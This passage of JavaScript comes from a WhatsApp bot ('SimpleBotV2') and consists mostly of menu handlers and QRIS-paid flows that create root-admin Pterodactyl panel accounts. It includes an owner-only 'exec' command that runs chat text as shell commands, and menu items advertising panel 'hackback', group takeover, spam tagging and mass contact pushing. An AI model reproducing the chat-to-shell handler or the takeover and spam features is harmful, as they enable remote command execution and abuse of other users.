                highlight_label: "Populer",
                rows: [
                  {
                    title: "AllMenu",
                    description: "A - B",
                    id: "allmenu"
                  },
                  {
                    title: "BugMenu",
                    description: "A - C",
                    id: "bugmenu"
                  }
                ]
              }
            ],
            has_multiple_buttons: false
          })
        }
      ]
    }
  }
}, { quoted: pantek });
}
break;
                         
case 'storemenu':{  
const teks = `╭─☰ STORE MENU
├─> addrespon
├─> delrespon
├─> listrespon
├─> done
├─> proses
├─> jpm
├─> jpm2
├─> playvideo
├─> jpmchfoto
├─> jpmallch
├─> jpmallch2 <memakai waktu>
├─> jpmtesti
├─> jpmslide
├─> jpmslideht
├─> sendtesti
├─> pushkontak
├─> pushkontak1
├─> pushkontak2
├─> savekontak
├─> savekontak2
├─> payment
├─> produk
╰─> subdomain`
await TamaMods.sendMessage(m.chat, {
  interactiveMessage: {
    title: teks,
    footer: `${footer}`,
    thumbnail: "https://files.catbox.moe/wbl5er.jpg",
    nativeFlowMessage: {
      messageParamsJson: JSON.stringify({
        limited_time_offer: {
          text: "SimpleBotV2",
          url: "t.me/TamaModss",
          copy_code: "Gen 2",
          expiration_time: Date.now() * 999
        },
        bottom_sheet: {
          in_thread_buttons_limit: 2,
          divider_indices: [1, 2, 3, 4, 5, 999],
          list_title: "SimpleBotV2",
          button_title: "TamaModss"
        },
        tap_target_configuration: {
          title: "> X <",
          description: "bomboclard",
          canonical_url: "https://t.me/TamaModss",
          domain: "shop.example.com",
          button_index: 0
        }
      }),
      buttons: [
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: "Telegram",
            url: "https://t.me/TamaModss"
          })
        },
        {
          name: "single_select",
          buttonParamsJson: JSON.stringify({
            title: "Tama Tizi",
            sections: [
              {
                title: "A - Z",
                highlight_label: "Populer",
                rows: [
                  {
                    title: "AllMenu",
                    description: "A - B",
                    id: "allmenu"
                  },
                  {
                    title: "BugMenu",
                    description: "A - C",
                    id: "bugmenu"
                  }
                ]
              }
            ],
            has_multiple_buttons: false
          })
        }
      ]
    }
  }
}, { quoted: pantek });
}
break;                                 
            
            case "digitaloceanmenu": case "domenu": {
const teks = `╭─☰ DIGITAL OCEAN MENU
├─> cvps
├─> createvps
├─> gantipwvps
├─> changeapido
├─> checkdo
├─> turnon
├─> turnoff
├─> sisadroplet
├─> deldroplet
├─> listdroplet
├─> rebuild
╰─> restartvps`
await TamaMods.sendMessage(m.chat, {
  interactiveMessage: {
    title: teks,
    footer: `${footer}`,
    thumbnail: "https://files.catbox.moe/wbl5er.jpg",
    nativeFlowMessage: {
      messageParamsJson: JSON.stringify({
        limited_time_offer: {
          text: "SimpleBotV2",
          url: "t.me/TamaModss",
          copy_code: "Gen 2",
          expiration_time: Date.now() * 999
        },
        bottom_sheet: {
          in_thread_buttons_limit: 2,
          divider_indices: [1, 2, 3, 4, 5, 999],
          list_title: "SimpleBotV2",
          button_title: "TamaModss"
        },
        tap_target_configuration: {
          title: "> X <",
          description: "bomboclard",
          canonical_url: "https://t.me/TamaModss",
          domain: "shop.example.com",
          button_index: 0
        }
      }),
      buttons: [
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: "Telegram",
            url: "https://t.me/TamaModss"
          })
        },
        {
          name: "single_select",
          buttonParamsJson: JSON.stringify({
            title: "Tama Tizi",
            sections: [
              {
                title: "A - Z",
                highlight_label: "Populer",
                rows: [
                  {
                    title: "AllMenu",
                    description: "A - B",
                    id: "allmenu"
                  },
                  {
                    title: "BugMenu",
                    description: "A - C",
                    id: "bugmenu"
                  }
                ]
              }
            ],
            has_multiple_buttons: false
          })
        }
      ]
    }
  }
}, { quoted: pantek });
}
break;                                                         
  case "orkut": case "orderkuotah2h": case "orkutmenu": case "orderkuotamenu": {
const teks = `╭─☰ ORKUT H2H MENU
├─> cekstatus
├─> ceksaldo-orkut
╰─> cekmutasi`
await TamaMods.sendMessage(m.chat, {
  interactiveMessage: {
    title: teks,
    footer: `${footer}`,
    thumbnail: "https://files.catbox.moe/wbl5er.jpg",
    nativeFlowMessage: {
      messageParamsJson: JSON.stringify({
        limited_time_offer: {
          text: "SimpleBotV2",
          url: "t.me/TamaModss",
          copy_code: "Gen 2",
          expiration_time: Date.now() * 999
        },
        bottom_sheet: {
          in_thread_buttons_limit: 2,
          divider_indices: [1, 2, 3, 4, 5, 999],
          list_title: "SimpleBotV2",
          button_title: "TamaModss"
        },
        tap_target_configuration: {
          title: "> X <",
          description: "bomboclard",
          canonical_url: "https://t.me/TamaModss",
          domain: "shop.example.com",
          button_index: 0
        }
      }),
      buttons: [
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: "Telegram",
            url: "https://t.me/TamaModss"
          })
        },
        {
          name: "single_select",
          buttonParamsJson: JSON.stringify({
            title: "Tama Tizi",
            sections: [
              {
                title: "A - Z",
                highlight_label: "Populer",
                rows: [
                  {
                    title: "AllMenu",
                    description: "A - B",
                    id: "allmenu"
                  },
                  {
                    title: "BugMenu",
                    description: "A - C",
                    id: "bugmenu"
                  }
                ]
              }
            ],
            has_multiple_buttons: false
          })
        }
      ]
    }
  }
}, { quoted: pantek });
}
break;                                 
                        
                        case "panelmenureseller": case "panelmenu": {
const teks = `╭─☰ PANEL MENU
├─> addseller
├─> delseller
├─> listseller
├─> addserverpanel
├─> delserverpanel
├─> listserverpanel
├─> addaksesgrub
├─> delaksesgrub
├─> listaksesgrub
├─> 1gb - unlimited
├─> c1gb - cunli
├─> cadmin1
├─> cpanel
├─> delpanelall
├─> deluserall
├─> clearall
├─> deladminall
├─> cadmin
├─> delpanel
├─> deladmin
├─> listpanel
├─> listadmin
╰─> linklog`
await TamaMods.sendMessage(m.chat, {
  interactiveMessage: {
    title: teks,
    footer: `${footer}`,
    thumbnail: "https://files.catbox.moe/wbl5er.jpg",
    nativeFlowMessage: {
      messageParamsJson: JSON.stringify({
        limited_time_offer: {
          text: "SimpleBotV2",
          url: "t.me/TamaModss",
          copy_code: "Gen 2",
          expiration_time: Date.now() * 999
        },
        bottom_sheet: {
          in_thread_buttons_limit: 2,
          divider_indices: [1, 2, 3, 4, 5, 999],
          list_title: "SimpleBotV2",
          button_title: "TamaModss"
        },
        tap_target_configuration: {
          title: "> X <",
          description: "bomboclard",
          canonical_url: "https://t.me/TamaModss",
          domain: "shop.example.com",
          button_index: 0
        }
      }),
      buttons: [
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: "Telegram",
            url: "https://t.me/TamaModss"
          })
        },
        {
          name: "single_select",
          buttonParamsJson: JSON.stringify({
            title: "Tama Tizi",
            sections: [
              {
                title: "A - Z",
                highlight_label: "Populer",
                rows: [
                  {
                    title: "AllMenu",
                    description: "A - B",
                    id: "allmenu"
                  },
                  {
                    title: "BugMenu",
                    description: "A - C",
                    id: "bugmenu"
                  }
                ]
              }
            ],
            has_multiple_buttons: false
          })
        }
      ]
    }
  }
}, { quoted: pantek });
}
break;                                 


case "panelmenuv2": case "panelmenu2": {
const teks = `╭─☰ PANEL V2 MENU
├─> addseller-v2
├─> delseller-v2
├─> listseller-v2
├─> 1gb-v2 - unlimited-v2
├─> c1gb-v2 - cunli-v2
├─> cadmin1-v2
├─> cpanel-v2
├─> delpanelall-v2
├─> deluserall-v2
├─> clearall-v2
├─> deladminall-v2
├─> cadmin-v2
├─> delpanel-v2
├─> deladmin-v2
├─> listpanel-v2
├─> listadmin-v2
╰─> linklog-v2`
await TamaMods.sendMessage(m.chat, {
  interactiveMessage: {
    title: teks,
    footer: `${footer}`,
    thumbnail: "https://files.catbox.moe/wbl5er.jpg",
    nativeFlowMessage: {
      messageParamsJson: JSON.stringify({
        limited_time_offer: {
          text: "SimpleBotV2",
          url: "t.me/TamaModss",
          copy_code: "Gen 2",
          expiration_time: Date.now() * 999
        },
        bottom_sheet: {
          in_thread_buttons_limit: 2,
          divider_indices: [1, 2, 3, 4, 5, 999],
          list_title: "SimpleBotV2",
          button_title: "TamaModss"
        },
        tap_target_configuration: {
          title: "> X <",
          description: "bomboclard",
          canonical_url: "https://t.me/TamaModss",
          domain: "shop.example.com",
          button_index: 0
        }
      }),
      buttons: [
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: "Telegram",
            url: "https://t.me/TamaModss"
          })
        },
        {
          name: "single_select",
          buttonParamsJson: JSON.stringify({
            title: "Tama Tizi",
            sections: [
              {
                title: "A - Z",
                highlight_label: "Populer",
                rows: [
                  {
                    title: "AllMenu",
                    description: "A - B",
                    id: "allmenu"
                  },
                  {
                    title: "BugMenu",
                    description: "A - C",
                    id: "bugmenu"
                  }
                ]
              }
            ],
            has_multiple_buttons: false
          })
        }
      ]
    }
  }
}, { quoted: pantek });
}
break;                                 

case "funmenu": case "scmdmenu": {
const teks = `╭─☰ FUN MENU
├─> confess
├─> balasmenfess
├─> tolakmenfess
├─> stopmenfess
├─> bekerja
├─> sound1 - sound161
├─> mangkane1 - mangkane54 ( sound )
├─> acumalaka ( sound )
├─> reza-kecap ( sound )
├─> farhan-kebab ( sound )
├─> omaga ( sound )
├─> kamu-nanya ( sound )
├─> anjay ( sound )
├─> siuu ( sound )
├─> jodoh
├─> emojimix
├─> emojigif
├─> cekkhodam
├─> cekganteng
├─> cekcantik
├─> kapankah
├─> ceksange
├─> cekkontol
├─> cekmemek
├─> cekjomok
├─> tambah
├─> kurang
├─> kali
├─> bagi
├─> paptt1
╰─> paptt2`
await TamaMods.sendMessage(m.chat, {
  interactiveMessage: {
    title: teks,
    footer: `${footer}`,
    thumbnail: "https://files.catbox.moe/wbl5er.jpg",
    nativeFlowMessage: {
      messageParamsJson: JSON.stringify({
        limited_time_offer: {
          text: "SimpleBotV2",
          url: "t.me/TamaModss",
          copy_code: "Gen 2",
          expiration_time: Date.now() * 999
        },
        bottom_sheet: {
          in_thread_buttons_limit: 2,
          divider_indices: [1, 2, 3, 4, 5, 999],
          list_title: "SimpleBotV2",
          button_title: "TamaModss"
        },
        tap_target_configuration: {
          title: "> X <",
          description: "bomboclard",
          canonical_url: "https://t.me/TamaModss",
          domain: "shop.example.com",
          button_index: 0
        }
      }),
      buttons: [
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: "Telegram",
            url: "https://t.me/TamaModss"
          })
        },
        {
          name: "single_select",
          buttonParamsJson: JSON.stringify({
            title: "Tama Tizi",
            sections: [
              {
                title: "A - Z",
                highlight_label: "Populer",
                rows: [
                  {
                    title: "AllMenu",
                    description: "A - B",
                    id: "allmenu"
                  },
                  {
                    title: "BugMenu",
                    description: "A - C",
                    id: "bugmenu"
                  }
                ]
              }
            ],
            has_multiple_buttons: false
          })
        }
      ]
    }
  }
}, { quoted: pantek });
}
break;                                 

case "installermenu": case "installmenu": {
const teks = `╭─☰ INSTALLER MENU
├─> hackbackpanel
├─> hackbackpanel2
├─> installpanel
├─> installpanel2
├─> startwings
├─> installthema
├─> installtemastellar
├─> installtemanebula
├─> installtemanightcore
├─> installtemabilling
├─> installtemaenigma
├─> uninstallpanel
╰─> uninstalltema`
await TamaMods.sendMessage(m.chat, {
  interactiveMessage: {
    title: teks,
    footer: `${footer}`,
    thumbnail: "https://files.catbox.moe/wbl5er.jpg",
    nativeFlowMessage: {
      messageParamsJson: JSON.stringify({
        limited_time_offer: {
          text: "SimpleBotV2",
          url: "t.me/TamaModss",
          copy_code: "Gen 2",
          expiration_time: Date.now() * 999
        },
        bottom_sheet: {
          in_thread_buttons_limit: 2,
          divider_indices: [1, 2, 3, 4, 5, 999],
          list_title: "SimpleBotV2",
          button_title: "TamaModss"
        },
        tap_target_configuration: {
          title: "> X <",
          description: "bomboclard",
          canonical_url: "https://t.me/TamaModss",
          domain: "shop.example.com",
          button_index: 0
        }
      }),
      buttons: [
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: "Telegram",
            url: "https://t.me/TamaModss"
          })
        },
        {
          name: "single_select",
          buttonParamsJson: JSON.stringify({
            title: "Tama Tizi",
            sections: [
              {
                title: "A - Z",
                highlight_label: "Populer",
                rows: [
                  {
                    title: "AllMenu",
                    description: "A - B",
                    id: "allmenu"
                  },
                  {
                    title: "BugMenu",
                    description: "A - C",
                    id: "bugmenu"
                  }
                ]
              }
            ],
            has_multiple_buttons: false
          })
        }
      ]
    }
  }
}, { quoted: pantek });
}
break;                                 

    case "grubmenu": case "groupmenu": {
const teks = `╭─☰ GROUP MENU
├─> add
├─> antilink
├─> antilink2
├─> antilinkall
├─> antitoxic
├─> antilinkwa
├─> antitoxic
├─> mute
├─> blacklistjpm
├─> welcome
├─> invite
├─> kick
├─> kicktime
├─> gcsider
├─> creategc
├─> close
├─> closetime
├─> opentime
├─> open
├─> hidetag
├─> spamtag
├─> kudetagc
├─> kudetagc2
├─> promoteall
├─> demoteall
├─> promote
├─> demote
├─> resetlinkgc
├─> on
├─> off
╰─> linkgc`
await TamaMods.sendMessage(m.chat, {
  interactiveMessage: {
    title: teks,
    footer: `${footer}`,
    thumbnail: "https://files.catbox.moe/wbl5er.jpg",
    nativeFlowMessage: {
      messageParamsJson: JSON.stringify({
        limited_time_offer: {
          text: "SimpleBotV2",
          url: "t.me/TamaModss",
          copy_code: "Gen 2",
          expiration_time: Date.now() * 999
        },
        bottom_sheet: {
          in_thread_buttons_limit: 2,
          divider_indices: [1, 2, 3, 4, 5, 999],
          list_title: "SimpleBotV2",
          button_title: "TamaModss"
        },
        tap_target_configuration: {
          title: "> X <",
          description: "bomboclard",
          canonical_url: "https://t.me/TamaModss",
          domain: "shop.example.com",
          button_index: 0
        }
      }),
      buttons: [
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: "Telegram",
            url: "https://t.me/TamaModss"
          })
        },
        {
          name: "single_select",
          buttonParamsJson: JSON.stringify({
            title: "Tama Tizi",
            sections: [
              {
                title: "A - Z",
                highlight_label: "Populer",
                rows: [
                  {
                    title: "AllMenu",
                    description: "A - B",
                    id: "allmenu"
                  },
                  {
                    title: "BugMenu",
                    description: "A - C",
                    id: "bugmenu"
                  }
                ]
              }
            ],
            has_multiple_buttons: false
          })
        }
      ]
    }
  }
}, { quoted: pantek });
}
break;                  
             
             case "ownermenu": {
const teks = `╭─☰ OWNER MENU
├─> autoread
├─> adddomain
├─> deldomain
├─> listdomain
├─> blokir
├─> unblokir
├─> layanan
├─> tagsw
├─> upswtag
├─> cekdns
├─> cekhost
├─> cekip
├─> trackip
├─> cekweb
├─> ceksubdo
├─> sendngl
├─> otomatisauto
├─> cekinfo
├─> autopromosi
├─> autoreadsw
├─> autotyping
├─> addcase
├─> delcase
├─> getcase
├─> getcase2
├─> listcase
├─> renamecase
├─> addfunction
├─> delfunction
├─> addowner
├─> delowner
├─> listowner
├─> addprem
├─> delprem
├─> listprem
├─> self/public
├─> settppbot
├─> clearsession
├─> clearchat
├─> restartbot
├─> getsc
├─> getip
├─> daftarsc
├─> hapussc
├─> svsc
├─> sendsc
├─> getfile
├─> listgc
╰─> joingc`
await TamaMods.sendMessage(m.chat, {
  interactiveMessage: {
    title: teks,
    footer: `${footer}`,
    thumbnail: "https://files.catbox.moe/wbl5er.jpg",
    nativeFlowMessage: {
      messageParamsJson: JSON.stringify({
        limited_time_offer: {
          text: "SimpleBotV2",
          url: "t.me/TamaModss",
          copy_code: "Gen 2",
          expiration_time: Date.now() * 999
        },
        bottom_sheet: {
          in_thread_buttons_limit: 2,
          divider_indices: [1, 2, 3, 4, 5, 999],
          list_title: "SimpleBotV2",
          button_title: "TamaModss"
        },
        tap_target_configuration: {
          title: "> X <",
          description: "bomboclard",
          canonical_url: "https://t.me/TamaModss",
          domain: "shop.example.com",
          button_index: 0
        }
      }),
      buttons: [
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: "Telegram",
            url: "https://t.me/TamaModss"
          })
        },
        {
          name: "single_select",
          buttonParamsJson: JSON.stringify({
            title: "Tama Tizi",
            sections: [
              {
                title: "A - Z",
                highlight_label: "Populer",
                rows: [
                  {
                    title: "AllMenu",
                    description: "A - B",
                    id: "allmenu"
                  },
                  {
                    title: "BugMenu",
                    description: "A - C",
                    id: "bugmenu"
                  }
                ]
              }
            ],
            has_multiple_buttons: false
          })
        }
      ]
    }
  }
}, { quoted: pantek });
}
break;                        

case "produk2": {
  
  const date = new Date();

  // Profil pengguna
  const profileText = `
┌───📋 *PROFIL PENGGUNA* ───┐
│ 👤 *Nama*  : ${m.pushName}
│ 👤 *Nomor*  : ${m.sender.split("@")[0]}
└────────────────────────────┘
`;

  // Teks utama
  const teks = `
┌───🌟 *SIMPLE BOT SHOP V2* 🌟───┐
│ ✨ *Selamat datang di Simple Bot Shop!*  
│ 💎 *Tempat terbaik untuk memenuhi kebutuhan digital Anda!*  
│ 🎯 *Pilih kategori di bawah ini untuk memulai:*  
└────────────────────────────┘
`;

  TamaMods.sendMessage(m.chat, {
    caption: profileText + teks,
    footer: "Tama Mods",
    image: { url: "https://files.catbox.moe/wbl5er.jpg" },
    buttons: [
      { buttonId: '.owner', buttonText: { displayText: 'Owner Tama 🔹' }, type: 1 },
      {
        buttonId: 'single_select',
        buttonText: { displayText: 'Jawa' },
        type: 4,
        nativeFlowInfo: {
          name: 'single_select',
          paramsJson: JSON.stringify({
            title: "Pilih Produk Tersedia",
            sections: [
              {
                title: "💻 *Buypanel dan Admin Panel*",
                rows: [
                  { title: "🖥️ Produk Buypanel", description: "💼 Solusi panel hosting otomatis untuk bisnis Anda.\n🔍 *Detail*: Harga mulai Rp50.000, proses cepat.", id: ".buypanel" },
                  { title: "🔧 Produk Admin Panel", description: "👨‍💻 Kelola panel admin dengan mudah dan profesional.\n🔍 *Detail*: Admin panel lengkap, user-friendly.", id: ".buyadminpanel" }
                ]
              },
              {
                title: "🌐 *VPS dan Hosting*",
                rows: [
                  { title: "🌍 Produk Buy VPS", description: "💻 VPS premium dengan kapasitas fleksibel.\n🔍 *Detail*: Harga bersaing, performa stabil.", id: ".buyvps" }
                ]
              },
              {
                title: "📜 Jual Script Canggih",
                rows: [
                  { title: "🔹️List Script ( Simple Bot V2 Gen 2 )", description: "📌 List Script Untuk Menlihat Semua Script Yang Di Jual Oleh Bot", id: ".buysc" }
                ]
              }
            ]
          })
        }
      }
    ],
    headerType: 4,
    viewOnce: true
  }, { quoted: pantek });
}
break
//------(Batas Case)------//
case "layanan": case "produk": {
				
const teks = `\`\`\`SILAHKAN PILIH LAYANAN YANG TERSEDIA\`\`\``
await TamaMods.sendMessage(m.chat, {
  footer: `${footer}`,
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: '𝐎𝐩𝐭𝐢͢𝐨𝐧𝐬',
          sections: [
            {
              title: '𝑪𝒉𝒐𝒐𝒔𝒆 ( 📑 ) 𝑭𝒆𝒂𝒕𝒖𝒓𝒆𝒔 𝑩𝒆𝒍𝒐𝒘',
              highlight_label: '𐁘',
              rows: [
                                {
                                    title: "𝐉𝐀𝐒𝐀 𝐈𝐍𝐒𝐓𝐀𝐋𝐋 𝐓𝐇𝐄𝐌𝐄",
                                    description: "install thema keren",
                                    id: ".jasainstalltema"
                                },
                                {
                                    title: "𝐉𝐀𝐒𝐀 𝐇𝐀𝐂𝐊𝐁𝐀𝐂𝐊 𝐏𝐀𝐍𝐄𝐋",
                                    description: "hack kembali panel bot whatsapp",
                                    id: ".jasahbpanel"
                                },
                                {
                                    title: "𝐏𝐀𝐍𝐄𝐋 𝐏𝐓𝐄𝐑𝐎𝐃𝐀𝐂𝐓𝐘𝐋",
                                    description: "panel run bot",
                                    id: ".buypanel"
                                },
                                {
                                    title: "𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑 𝐏𝐀𝐍𝐄𝐋",
                                    description: "reseller panel bot",
                                    id: ".buyresellerpanel"
                                },
                                {
                                    title: "𝐀𝐃𝐌𝐈𝐍 𝐏𝐀𝐍𝐄𝐋",
                                    description: "admin panel bot",
                                    id: ".buyadp"
                                },
                                {
                                    title: "𝐎𝐖𝐍𝐄𝐑 𝐏𝐀𝐍𝐄𝐋",
                                    description: "owner panel bot",
                                    id: ".buyownpanel"
                                },
                                {
                                    title: "𝐏𝐀𝐑𝐓𝐍𝐄𝐑 𝐏𝐀𝐍𝐄𝐋",
                                    description: "partner panel bot",
                                    id: ".buyptpanel"
                                },
                                {
                                    title: "𝐕𝐏𝐒 𝐃𝐈𝐆𝐈𝐓𝐀𝐋 𝐎𝐂𝐄𝐀𝐍",
                                    description: "vps do untuk run bot",
                                    id: ".buyvps"
                                },
                                {
                                    title: "𝐀𝐊𝐔𝐍 𝐃𝐈𝐆𝐈𝐓𝐀𝐋 𝐎𝐂𝐄𝐀𝐍",
                                    description: "akun do untuk create vps",
                                    id: ".buydo"
                                },
                                {
                                    title: "𝐒𝐇𝐀𝐑𝐄",
                                    description: "jasa share/jpm untuk membantu promosi",
                                    id: ".buyjasashare"
                                },
                                {
                                    title: "𝐅𝐈𝐓𝐔𝐑 𝐒𝐂𝐑𝐈𝐏𝐓",
                                    description: "beli fitur script premium dan menarik",
                                    id: ".buyfitur"
                                },
                                {
                                    title: "𝐒𝐂𝐑𝐈𝐏𝐓",
                                    description: "beli script simple bot v2 gen 2",
                                    id: ".buysc"
                                },
                                {
                                    title: "𝐒𝐓𝐎𝐂𝐊 𝐒𝐂𝐑𝐈𝐏𝐓",
                                    description: "beli stock script yang disediakan owner",
                                    id: ".listscript"
                                },
                                {
                                    title: "𝐃𝐎𝐌𝐀𝐈𝐍",
                                    description: "domain untuk create subdo",
                                    id: ".buydomain"
                                },
                                {
                                    title: "𝐉𝐀𝐒𝐀 𝐈𝐍𝐒𝐓𝐀𝐋𝐋 𝐏𝐀𝐍𝐄𝐋",
                                    description: "install panel bot whatsapp",
                                    id: ".jasainstallpanel"
                                }
                                ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  image: { url: "https://files.catbox.moe/wbl5er.jpg" },
  caption: `${teks}`,
  contextInfo: {
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namasaluran
   }
  },
}, {quoted: pantek})
}
break;
case "exec": {
    if (!isOwner) return Reply("Khusus Owner Only")
//    if (!isBot) return;
    if (!budy.startsWith(".exec")) return;
    
    const { exec } = require("child_process");
    const args = budy.trim().split(' ').slice(1).join(' ');
    if (!args) return Reply(`*Example:* ${prefix + command} ls`);
    exec(args, (err, stdout) => {
        if (err) return Reply(String(err));
        if (stdout) return Reply(stdout);
    });
}
break;
case "buyptpanel": {
    if (m.isGroup) return Reply("❌ *Pembelian Partner Panel Pterodactyl hanya bisa di dalam private chat!*");
    if (db.users[m.sender].status_deposit) return Reply("⚠️ Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");
    if (!text) return Reply(example("username"));
    if (text.includes(" ")) return Reply("⚠️ *Username tidak boleh memakai spasi!*");

    let us = crypto.randomBytes(2).toString('hex');
    let Obj = {};
    Obj.harga = "30000"; // Harga untuk panel publik
    Obj.username = text.toLowerCase() + us;
    const UrlQr = global.qrisOrderKuota;

    const amount = Number(Obj.harga) + generateRandomNumber(20, 50);

    const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apipayment2}&amount=${amount}&codeqr=${global.QrisOrderKuota}`);

    const teks3 = `
    🛒 *INFORMASI PEMBAYARAN*

        *💳 ID Transaksi :* ${get.data.result.transactionId}
        *💰 Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
        *📦 Barang :* PT Panel Pterodactyl
        *⏳ Pembayaran Expired :* 5 menit

        ⚠️ *Perhatian*: QRIS hanya berlaku dalam 5 menit. Jangan lewatkan kesempatan ini!`
let msgQr = await TamaMods.sendMessage(m.chat, {
  footer: `${botname2}\nAuto Order Pt Panel`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
    db.users[m.sender].status_deposit = true;
    db.users[m.sender].saweria = {
        msg: msgQr, 
        chat: m.sender,
        idDeposit: get.data.result.transactionId, 
        amount: get.data.result.amount.toString(), 
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
                    await TamaMods.sendMessage(db.users[m.sender].saweria.chat, {text: "❌ QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg});
                    await TamaMods.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
                    db.users[m.sender].status_deposit = false;
                    await clearInterval(db.users[m.sender].saweria.exp);
                    delete db.users[m.sender].saweria;
                }
            }, 300000);
        }
    };

    await db.users[m.sender].saweria.exp();

    while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
        await sleep(8000);

        const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apipayment2}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`);
        const req = await resultcek.data;

        if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
            db.users[m.sender].status_deposit = false;
            await clearInterval(db.users[m.sender].saweria.exp);
            await TamaMods.sendMessage(db.users[m.sender].saweria.chat, {text: `
            🎉 *PEMBAYARAN BERHASIL DITERIMA ✅*

            📜 *ID Transaksi:* ${db.users[m.sender].saweria.idDeposit}
            💰 *Total Pembayaran:* Rp${await toIDR(db.users[m.sender].saweria.amount)}
            🎁 *Barang:* Partner Panel Pterodactyl
            `}, {quoted: db.users[m.sender].saweria.msg});

            let username = Obj.username;
            let email = username + "@gmail.com";
            let name = capital(username);
            let password = crypto.randomBytes(4).toString('hex');

            let f = await fetch(global.global.domain + "/api/application/users", {
                "method": "POST",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey
                },
                "body": JSON.stringify({
                    "email": email,
                    "username": username.toLowerCase(),
                    "first_name": name,
                    "last_name": "Admin",
                    "root_admin": true,
                    "language": "en",
                    "password": password.toString()
                })
            });

            let data = await f.json();
            if (data.errors) return Reply(JSON.stringify(data.errors[0], null, 2));
            let user = data.attributes;
            var teks = `
            🎉 *Berhasil Membuat Partner Panel ✅*

            📑 *ID User:* ${user.id}
            👤 *Nama:* ${user.first_name}
            🏷 *Username:* ${user.username}
            🔑 *Password:* ${password.toString()}
            🌐 *Login:* ${global.global.domain}
            🗣 *Gabung Whatsapp:* ${global.linkgbbuypublic}

            *⚠️ Rules Partner Panel:*
            - Jangan Maling SC! Jika ketahuan, akun akan dihapus!
            - Simpan data akun ini dengan baik!
            - Gunakan panel seperlunya saja, jangan asal buat!
            - Untuk klaim garansi, wajib membawa bukti SS saat pembelian.
            `;

            await TamaMods.sendMessage(db.users[m.sender].saweria.chat, {text: teks}, {quoted: pantek});
            await TamaMods.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
            delete db.users[m.sender].saweria;
        }
    }
}

break
//------(Batas Case)------//
case "installbuyyer1": {
 if (m.isGroup) return Reply("jasa install panel hanya dapat dilakukan melalui private chat.");
 if (db.users[m.sender].status_deposit) return Reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

 function generateRandomNumber(min, max) {
 return Math.floor(Math.random() * (max - min + 1)) + min;
 }

 let amount = 5000 + generateRandomNumber(0, 0);

 // Updated API request to use new URL and API key
 const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apipayment2}&amount=${amount}&codeqr=${global.QrisOrderKuota}`);

 const teksPembayaran = `
 *▧ INFORMASI PEMBAYARAN*

 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Install Panel Pterodactyl
 *• Expired :* 5 menit

 *Note :*
 QRIS pembayaran hanya berlaku dalam 5 menit. Jika pembayaran berhasil, bot akan otomatis melanjutkan instalasi tema.
 `

 let msgQr = await TamaMods.sendMessage(m.chat, {
  footer: `${botname2}\nAuto Order Jasa`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teksPembayaran,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
        db.users[m.sender].status_deposit = true;
        db.users[m.sender].saweria = {
            msg: msgQr,
            chat: m.sender,
            idDeposit: get.data.result.transactionId,
            amount: get.data.result.amount.toString(),
            exp: function () {
                setTimeout(async () => {
                    if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
                        await TamaMods.sendMessage(db.users[m.sender].saweria.chat, {text: "⚠️ Waktu pembayaran telah expired, transaksi dibatalkan!"}, {quoted: db.users[m.sender].saweria.msg});
                        await TamaMods.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
                        db.users[m.sender].status_deposit = false;
                        await clearInterval(db.users[m.sender].saweria.exp);
                        delete db.users[m.sender].saweria;
                    }
                }, 300000); // 5 menit
            }
        };

 await db.users[m.sender].saweria.exp();

 while (db.users[m.sender].status_deposit) {
 await sleep(8000);
 
 // Updated API request to check the payment status using new API URL and API key
